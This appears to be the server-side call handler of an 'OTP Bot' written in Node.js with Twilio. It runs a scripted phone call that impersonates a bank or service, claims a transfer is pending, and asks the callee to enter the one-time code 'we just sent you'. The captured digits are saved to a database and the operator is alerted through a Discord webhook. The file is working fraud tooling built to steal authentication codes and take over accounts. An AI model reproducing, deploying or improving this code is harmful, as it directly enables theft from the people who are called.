module.exports = function(request, response) {
    /**
     * File containing the configurations necessary for the proper functioning of the system.
     */
    const config = require('.././config');


    const {
        Webhook,
        MessageBuilder
    } = require('discord-webhook-node');
    const hook = new Webhook(config.discordwebhook || '');

    /**
     * Integration of SQLITE3 dependencies.
     */
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');

    /**
     * Retrieval of posted variables allowing ordering of the API response in TwiML.
     */
    var input = request.body.RecordingUrl || request.body.Digits || "0";
    var callSid = request.body.CallSid;

    if (!!!callSid) {
        return response.status(200).json({
            error: 'Please give us the callSid.'
        });
    }

    /**
     * We retrieve the Service used in this call and then return the correct audio to use.
     */
    db.get('SELECT service, name, otplength FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err) {
            return console.log(err.message);
        }

        /**
         * In case the callSid is not found, we use the default audio,
         * Same for the name of the person to call,
         * Same for the otp length.
         */
		var service = row.service == null ? 'default' : row.service;
        var name = row.name == null ? '' : row.name;
        var otplength = row.otplength == null ? '5' : row.otplength;
		
        var service = row.service == null ? 'default' : row.service;
        var name = row.name == null ? '' : row.name;
        var otplength = row.otplength == null ? '6' : row.otplength;

        /**
         *Here we create the URLs of the audios using the data in the config file.
         */
        var endurl = config.serverurl + '/stream/end';
        var askurl = config.serverurl + '/stream/' + service;
        var numdigits = otplength;
		

        /**
         * Here we create the TwiML response to return, adding the audio URL.
         */
        var end = '<?xml version="1.0" encoding="UTF-8"?><Response><Say voice="Polly.Joanna">Your account is now secured. Thank You!</Say></Response>';
        var ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="15" numDigits="' + numdigits + '"><Pause length="2"/><Say voice="Polly.Joanna"><prosody rate="slow">For security reasons we have to verify You are the real owner of this account in order to block this request. Please dial the ' + numdigits + ' digit code we just sent you.</prosody></Say></Gather></Response>';

        var otpsend = `<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="1"><Pause length="4"/><Say voice="Polly.Joanna"><prosody rate="slow">Hello ${row.name}, Welcome to ${row.service} We have recently received a request to process a transfer scheduled  on your account.If this was not you please press 1, If this was you please press 2.</prosody></Say></Gather></Response>`;
        var otpSendEnd = end;

        /**
         * If the user sent the code, then add it to the database and return the ending audio: end of call.
         */
        length = service == 'banque' ? 8 : otplength;
        db.get('SELECT * FROM calls WHERE callSid = ?', [request.body.CallSid], (err, row) => {
            if (err) {
                return console.log(err.message);
            }

            if(row.otpsend == 0 && input.match(/^[1-2]$/) == null) {
                respond(otpsend);
            } else if(row.otpsend == 0 && input.match(/^[1-2]$/) != null) {
                if(input == 1) {
                    db.run(`UPDATE calls SET otpsend = 1 WHERE callSid = ?`, [request.body.CallSid], function(err) {
                        if (err) {
                            return console.log(err.message);
                        }
                    });

                    embed = new MessageBuilder()
                        .setTitle(`OTP Bot`)
                        .setColor('15158332')
                        .setDescription('Status: **Send OTP**')
                        .setFooter(row.user)
                        .setTimestamp();
                    hook.send(embed);

                    respond(ask);
                } else {
                    embed = new MessageBuilder()
                        .setTitle(`:mobile_phone: ${row.itsto}`)
                        .setColor('15158332')
                        .setDescription('Status: **User pressed 2 (Exit)**')
                        .setFooter(row.user)
                        .setTimestamp();
                    hook.send(embed);
                    respond(otpSendEnd);
                }
            } else {
                if(input.length == length && input.match(/^[0-9]+$/) != null && input != null) {
                    /**
                     * End audio.
                     */
                    respond(end);
                    /**
                     * Adding code to DB.
                     */
                    db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, request.body.CallSid], function(err) {
                        if (err) {
                            return console.log(err.message);
                        }
                    });
                } else {
                    /**
                     * We return the basic TwiML to replay the audio.
                     */
                    respond(ask);
                }
            }
        });
    });

    function respond(text) {
        response.type('text/xml');
        response.send(text);
    }
};